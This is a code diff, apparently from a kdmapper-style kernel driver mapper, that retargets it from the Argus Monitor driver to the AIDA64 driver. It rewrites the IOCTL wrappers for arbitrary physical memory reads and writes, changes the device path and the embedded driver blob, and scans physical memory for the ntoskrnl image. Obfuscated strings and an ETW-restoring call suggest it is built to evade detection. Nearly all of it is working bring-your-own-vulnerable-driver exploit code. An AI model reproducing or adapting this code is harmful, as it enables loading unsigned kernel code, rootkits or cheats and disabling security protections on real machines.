@@ -10,114 +10,37 @@
 #include "nt.hpp"
 #include "intel_driver_resource.hpp"
 
-static void ArgusAddChecksum(uint8_t* buf, uint32_t total_len) {
-	uint16_t sum = 0;
-	for (uint32_t i = 0; i < total_len - 2; i++)
-		sum += buf[i];
-	buf[total_len - 2] = (uint8_t)(sum >> 8);
-	buf[total_len - 1] = (uint8_t)(sum & 0xFF);
-}
-
-static bool ArgusHandshake() {
-	uint8_t input[0x200] = {};
-	uint8_t output[0x210] = {};
-	ArgusAddChecksum(input, sizeof(input));
-	DWORD bytes = 0;
-	BOOL ok = DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_HANDSHAKE,
-		input, sizeof(input), output, sizeof(output), &bytes, nullptr);
-	if (!ok && GetLastError() == 1117)
-		return true;
-	return ok != FALSE;
-}
-
-static bool ArgusSlotMap(uint32_t slot, uint64_t phys_addr, uint32_t size) {
-	uint8_t input[0x28] = {};
-	uint8_t output[0x20] = {};
-	*reinterpret_cast<uint32_t*>(input) = slot;
-	*reinterpret_cast<uint64_t*>(input + 4) = phys_addr;
-	*reinterpret_cast<uint32_t*>(input + 12) = size;
-	*reinterpret_cast<uint32_t*>(input + 16) = 0xFF;
-	*reinterpret_cast<uint32_t*>(input + 20) = 1;
-	ArgusAddChecksum(input, sizeof(input));
-	DWORD bytes = 0;
-	if (!DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_PHYSMEM_MAP,
-		input, sizeof(input), output, sizeof(output), &bytes, nullptr))
-		return false;
-	return *reinterpret_cast<uint64_t*>(output) != 0;
-}
-
-static void ArgusSlotUnmap(uint32_t slot) {
+static bool Aida64BulkPhysRead(uint64_t phys_addr, void* dest_va, uint32_t size) {
 	uint8_t input[0x18] = {};
-	*reinterpret_cast<uint32_t*>(input) = slot;
-	ArgusAddChecksum(input, sizeof(input));
+	*reinterpret_cast<uint32_t*>(input + 0x00) = size;
+	*reinterpret_cast<uint32_t*>(input + 0x04) = (uint32_t)(phys_addr & 0xFFFFFFFF);
+	*reinterpret_cast<uint32_t*>(input + 0x08) = (uint32_t)(phys_addr >> 32);
+	*reinterpret_cast<uint64_t*>(input + 0x10) = (uint64_t)dest_va;
 	DWORD bytes = 0;
-	DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_PHYSMEM_UNMAP,
-		input, sizeof(input), nullptr, 0, &bytes, nullptr);
+	return DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_PHYS_READ_BULK,
+		input, sizeof(input), input, sizeof(input), &bytes, nullptr) != FALSE;
 }
 
-static bool ArgusSlotReadDword(uint32_t slot, uint32_t offset, uint32_t* value) {
-	uint8_t input[0x18] = {};
-	uint8_t output[0x18] = {};
-	*reinterpret_cast<uint32_t*>(input) = slot;
-	*reinterpret_cast<uint32_t*>(input + 4) = offset;
-	ArgusAddChecksum(input, sizeof(input));
+static bool Aida64PhysRead32(uint64_t phys_addr, uint32_t* value) {
+	uint8_t buf[0x10] = {};
+	*reinterpret_cast<uint32_t*>(buf + 0x08) = (uint32_t)(phys_addr & 0xFFFFFFFF);
+	*reinterpret_cast<uint32_t*>(buf + 0x0C) = (uint32_t)(phys_addr >> 32);
 	DWORD bytes = 0;
-	if (!DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_PHYSMEM_RD_DW,
-		input, sizeof(input), output, sizeof(output), &bytes, nullptr))
+	if (!DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_PHYS_READ_DWORD,
+		buf, sizeof(buf), buf, sizeof(buf), &bytes, nullptr))
 		return false;
-	*value = *reinterpret_cast<uint32_t*>(output);
+	*value = *reinterpret_cast<uint32_t*>(buf + 0x04);
 	return true;
 }
 
-static bool ArgusSlotWriteDword(uint32_t slot, uint32_t offset, uint32_t value) {
-	uint8_t input[0x20] = {};
-	*reinterpret_cast<uint32_t*>(input) = slot;
-	*reinterpret_cast<uint32_t*>(input + 4) = offset;
-	*reinterpret_cast<uint32_t*>(input + 8) = value;
-	ArgusAddChecksum(input, sizeof(input));
+static bool Aida64PhysWrite32(uint64_t phys_addr, uint32_t value) {
+	uint8_t buf[0x10] = {};
+	*reinterpret_cast<uint32_t*>(buf + 0x04) = value;
+	*reinterpret_cast<uint32_t*>(buf + 0x08) = (uint32_t)(phys_addr & 0xFFFFFFFF);
+	*reinterpret_cast<uint32_t*>(buf + 0x0C) = (uint32_t)(phys_addr >> 32);
 	DWORD bytes = 0;
-	return DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_PHYSMEM_WR_DW,
-		input, sizeof(input), nullptr, 0, &bytes, nullptr) != FALSE;
-}
-
-static bool ArgusSlotReadByte(uint32_t slot, uint32_t offset, uint8_t* value) {
-	uint8_t input[0x18] = {};
-	uint8_t output[0x18] = {};
-	*reinterpret_cast<uint32_t*>(input) = slot;
-	*reinterpret_cast<uint32_t*>(input + 4) = offset;
-	ArgusAddChecksum(input, sizeof(input));
-	DWORD bytes = 0;
-	if (!DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_PHYSMEM_RD_BYTE,
-		input, sizeof(input), output, sizeof(output), &bytes, nullptr))
-		return false;
-	*value = output[0];
-	return true;
-}
-
-static bool ArgusSlotWriteByte(uint32_t slot, uint32_t offset, uint8_t value) {
-	uint8_t input[0x20] = {};
-	*reinterpret_cast<uint32_t*>(input) = slot;
-	*reinterpret_cast<uint32_t*>(input + 4) = offset;
-	*reinterpret_cast<uint64_t*>(input + 8) = value;
-	ArgusAddChecksum(input, sizeof(input));
-	DWORD bytes = 0;
-	return DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_PHYSMEM_WR_BYTE,
-		input, sizeof(input), nullptr, 0, &bytes, nullptr) != FALSE;
-}
-
-static bool ArgusSingleReadDword(uint64_t phys_addr, uint32_t* value) {
-	uint8_t input[0x20] = {};
-	uint8_t output[0x18] = {};
-	*reinterpret_cast<uint64_t*>(input) = phys_addr;
-	*reinterpret_cast<uint32_t*>(input + 8) = 0xFF;
-	*reinterpret_cast<uint32_t*>(input + 12) = 0;
-	ArgusAddChecksum(input, sizeof(input));
-	DWORD bytes = 0;
-	if (!DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_PHYSMEM_SINGLE,
-		input, sizeof(input), output, sizeof(output), &bytes, nullptr))
-		return false;
-	*value = *reinterpret_cast<uint32_t*>(output);
-	return true;
+	return DeviceIoControl(intel_driver::hDevice, intel_driver::IOCTL_PHYS_WRITE_DWORD,
+		buf, sizeof(buf), nullptr, 0, &bytes, nullptr) != FALSE;
 }
 
 HANDLE intel_driver::hDevice = 0;
@@ -155,7 +78,7 @@ std::wstring intel_driver::GetDriverPath() {
 }
 
 bool intel_driver::IsRunning() {
-	auto devPath = ENCW(L"\\\\.\\ArgusMonitorCTLD");
+	auto devPath = ENCW(L"\\\\.\\AIDA64Driver");
 	const HANDLE file_handle = CreateFileW(devPath.c_str(), FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
 	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
 	{
@@ -346,57 +269,14 @@ bool intel_driver::PhysicalRead(uint64_t physical_address, void* buffer, uint64_
 	if (!hDevice || hDevice == INVALID_HANDLE_VALUE || !buffer || !size)
 		return false;
 
-	constexpr uint32_t SLOT = 0;
-	constexpr uint32_t MAX_MAP = 0x20000;
+	constexpr uint32_t MAX_CHUNK = 0x20000;
 
 	uint64_t done = 0;
 	while (done < size) {
-		uint64_t cur_pa = physical_address + done;
-		uint64_t aligned = cur_pa & ~0xFFFULL;
-		uint32_t off_in_page = (uint32_t)(cur_pa - aligned);
-		uint32_t remaining = (uint32_t)(size - done);
-		uint32_t map_size = (remaining + off_in_page + 0xFFF) & ~0xFFFU;
-		if (map_size > MAX_MAP)
-			map_size = MAX_MAP;
-		uint32_t chunk = map_size - off_in_page;
-		if (chunk > remaining)
-			chunk = remaining;
-
-		if (!ArgusSlotMap(SLOT, aligned, map_size))
+		uint64_t remaining = size - done;
+		uint32_t chunk = (uint32_t)(remaining < MAX_CHUNK ? remaining : MAX_CHUNK);
+		if (!Aida64BulkPhysRead(physical_address + done, (uint8_t*)buffer + done, chunk))
 			return false;
-
-		uint8_t* dest = (uint8_t*)buffer + done;
-		uint32_t pos = 0;
-
-		while (pos < chunk && ((off_in_page + pos) & 3) != 0) {
-			uint8_t val;
-			if (!ArgusSlotReadByte(SLOT, off_in_page + pos, &val)) {
-				ArgusSlotUnmap(SLOT);
-				return false;
-			}
-			dest[pos++] = val;
-		}
-
-		while (pos + 4 <= chunk) {
-			uint32_t val;
-			if (!ArgusSlotReadDword(SLOT, off_in_page + pos, &val)) {
-				ArgusSlotUnmap(SLOT);
-				return false;
-			}
-			memcpy(dest + pos, &val, 4);
-			pos += 4;
-		}
-
-		while (pos < chunk) {
-			uint8_t val;
-			if (!ArgusSlotReadByte(SLOT, off_in_page + pos, &val)) {
-				ArgusSlotUnmap(SLOT);
-				return false;
-			}
-			dest[pos++] = val;
-		}
-
-		ArgusSlotUnmap(SLOT);
 		done += chunk;
 	}
 	return true;
@@ -406,57 +286,49 @@ bool intel_driver::PhysicalWrite(uint64_t physical_address, const void* buffer, 
 	if (!hDevice || hDevice == INVALID_HANDLE_VALUE || !buffer || !size)
 		return false;
 
-	constexpr uint32_t SLOT = 0;
-	constexpr uint32_t MAX_MAP = 0x20000;
+	const uint8_t* src = (const uint8_t*)buffer;
+	uint64_t pos = 0;
 
-	uint64_t done = 0;
-	while (done < size) {
-		uint64_t cur_pa = physical_address + done;
-		uint64_t aligned = cur_pa & ~0xFFFULL;
-		uint32_t off_in_page = (uint32_t)(cur_pa - aligned);
-		uint32_t remaining = (uint32_t)(size - done);
-		uint32_t map_size = (remaining + off_in_page + 0xFFF) & ~0xFFFU;
-		if (map_size > MAX_MAP)
-			map_size = MAX_MAP;
-		uint32_t chunk = map_size - off_in_page;
-		if (chunk > remaining)
-			chunk = remaining;
-
-		if (!ArgusSlotMap(SLOT, aligned, map_size))
+	uint32_t head_misalign = (uint32_t)(physical_address & 3);
+	if (head_misalign && size > 0) {
+		uint64_t aligned_pa = physical_address & ~3ULL;
+		uint32_t existing;
+		if (!Aida64PhysRead32(aligned_pa, &existing))
 			return false;
 
-		const uint8_t* src = (const uint8_t*)buffer + done;
-		uint32_t pos = 0;
+		uint8_t* bytes = (uint8_t*)&existing;
+		uint32_t avail = 4 - head_misalign;
+		uint32_t copy_count = avail < (uint32_t)size ? avail : (uint32_t)size;
+		memcpy(bytes + head_misalign, src, copy_count);
 
-		while (pos < chunk && ((off_in_page + pos) & 3) != 0) {
-			if (!ArgusSlotWriteByte(SLOT, off_in_page + pos, src[pos])) {
-				ArgusSlotUnmap(SLOT);
-				return false;
-			}
-			pos++;
-		}
+		if (!Aida64PhysWrite32(aligned_pa, existing))
+			return false;
 
-		while (pos + 4 <= chunk) {
-			uint32_t val;
-			memcpy(&val, src + pos, 4);
-			if (!ArgusSlotWriteDword(SLOT, off_in_page + pos, val)) {
-				ArgusSlotUnmap(SLOT);
-				return false;
-			}
-			pos += 4;
-		}
-
-		while (pos < chunk) {
-			if (!ArgusSlotWriteByte(SLOT, off_in_page + pos, src[pos])) {
-				ArgusSlotUnmap(SLOT);
-				return false;
-			}
-			pos++;
-		}
-
-		ArgusSlotUnmap(SLOT);
-		done += chunk;
+		pos += copy_count;
 	}
+
+	while (pos + 4 <= size) {
+		uint32_t val;
+		memcpy(&val, src + pos, 4);
+		if (!Aida64PhysWrite32(physical_address + pos, val))
+			return false;
+		pos += 4;
+	}
+
+	if (pos < size) {
+		uint64_t tail_pa = physical_address + pos;
+		uint32_t existing;
+		if (!Aida64PhysRead32(tail_pa, &existing))
+			return false;
+
+		uint8_t* bytes = (uint8_t*)&existing;
+		uint32_t remaining = (uint32_t)(size - pos);
+		memcpy(bytes, src + pos, remaining);
+
+		if (!Aida64PhysWrite32(tail_pa, existing))
+			return false;
+	}
+
 	return true;
 }
 
@@ -489,38 +361,38 @@ bool intel_driver::ScanForNtoskrnlPhysBase() {
 
 	for (uint64_t pa = 0; pa < MAX_SCAN; pa += LARGE_PAGE) {
 		uint32_t mz_dw = 0;
-		if (!ArgusSingleReadDword(pa, &mz_dw))
+		if (!Aida64PhysRead32(pa, &mz_dw))
 			continue;
 		if ((mz_dw & 0xFFFF) != IMAGE_DOS_SIGNATURE)
 			continue;
 
 		uint32_t lfanew_dw = 0;
-		if (!ArgusSingleReadDword(pa + 0x3C, &lfanew_dw))
+		if (!Aida64PhysRead32(pa + 0x3C, &lfanew_dw))
 			continue;
 		LONG e_lfanew = (LONG)lfanew_dw;
 		if (e_lfanew <= 0 || (ULONG)e_lfanew >= 0x800)
 			continue;
 
 		uint32_t pe_sig = 0;
-		if (!ArgusSingleReadDword(pa + e_lfanew, &pe_sig))
+		if (!Aida64PhysRead32(pa + e_lfanew, &pe_sig))
 			continue;
 		if (pe_sig != IMAGE_NT_SIGNATURE)
 			continue;
 
 		uint32_t magic_dw = 0;
-		if (!ArgusSingleReadDword(pa + e_lfanew + 0x18, &magic_dw))
+		if (!Aida64PhysRead32(pa + e_lfanew + 0x18, &magic_dw))
 			continue;
 		if ((magic_dw & 0xFFFF) != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
 			continue;
 
 		uint32_t sizeOfImage = 0;
-		if (!ArgusSingleReadDword(pa + e_lfanew + 0x50, &sizeOfImage))
+		if (!Aida64PhysRead32(pa + e_lfanew + 0x50, &sizeOfImage))
 			continue;
 		if (sizeOfImage != ntoskrnlImageSize)
 			continue;
 
 		uint32_t exportVA = 0;
-		if (!ArgusSingleReadDword(pa + e_lfanew + 0x88, &exportVA))
+		if (!Aida64PhysRead32(pa + e_lfanew + 0x88, &exportVA))
 			continue;
 		if (!exportVA)
 			continue;
@@ -641,7 +513,7 @@ NTSTATUS intel_driver::Load() {
 			return STATUS_DISK_OPERATION_FAILED;
 	}
 	else {
-		driverData.assign(argus_monitor_driver, argus_monitor_driver + argus_monitor_driver_size);
+		driverData.assign(aida64_driver, aida64_driver + aida64_driver_size);
 	}
 
 	std::wstring driver_path = GetDriverPath();
@@ -678,7 +550,7 @@ NTSTATUS intel_driver::Load() {
 		return status;
 	}
 
-	auto devOpen = ENCW(L"\\\\.\\ArgusMonitorCTLD");
+	auto devOpen = ENCW(L"\\\\.\\AIDA64Driver");
 	hDevice = CreateFileW(devOpen.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	RestoreUsermodeEtw();
@@ -687,11 +559,6 @@ NTSTATUS intel_driver::Load() {
 	{
 		intel_driver::Unload();
 		return STATUS_NOT_FOUND;
-	}
-
-	if (!ArgusHandshake()) {
-		intel_driver::Unload();
-		return STATUS_UNSUCCESSFUL;
 	}
 
 	ntoskrnlAddr = kdmUtils::GetKernelModuleAddress(ENC("ntoskrnl.exe"));
